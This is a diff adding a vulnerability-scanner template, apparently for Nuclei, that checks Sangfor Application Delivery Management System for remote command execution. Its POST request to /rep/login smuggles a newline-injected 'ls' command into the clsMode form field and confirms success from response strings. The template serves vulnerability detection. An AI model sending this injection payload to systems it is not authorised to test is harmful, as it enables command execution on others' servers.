@@ -1,0 +1,27 @@
+id: sangfor-application-delivery-management-system-login-rce
+info:
+  name: Sangfor Application Delivery Management System Login Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rep/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: "clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "API-CT_SYS_FAIL_LIST"
+          - "cluster_mode_othersaclog"
+      - type: word
+        part: header
+        words:
+          - "text/html"
